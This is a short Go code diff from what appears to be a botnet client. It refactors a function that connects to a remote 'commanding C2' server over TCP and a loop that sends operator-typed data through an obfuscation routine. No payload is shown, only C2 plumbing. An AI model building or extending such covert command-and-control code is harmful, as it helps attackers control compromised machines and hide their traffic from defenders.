@@ -15,10 +15,6 @@ const (
 	TYPE       = "tcp4"
 )
 
-var (
-	O msg.Bot
-)
-
 func ConnectToCommandingC2() (net.Conn) {
 	server, err := net.Dial(TYPE, REMOTEHOST+REMORTPORT)
 	if err != nil {
@@ -29,13 +25,12 @@ func ConnectToCommandingC2() (net.Conn) {
 	return server;
 }
 
-func WriteData(server net.Conn) () {
-	O.Uid = msg.GenerateRandomUid()
+func WriteData(server net.Conn, B *msg.Bot) () {
 	for {
-		O.Com.Data = messageInput("Data")
-		O.Com.Command = []byte("");
+		B.Com.Data = messageInput("Data")
+		B.Com.Command = []byte("");
 		
-		x, err := server.Write(O.ObfuscateData())
+		x, err := server.Write(B.ObfuscateData())
 		if err != nil {
 			return;
 		} else {
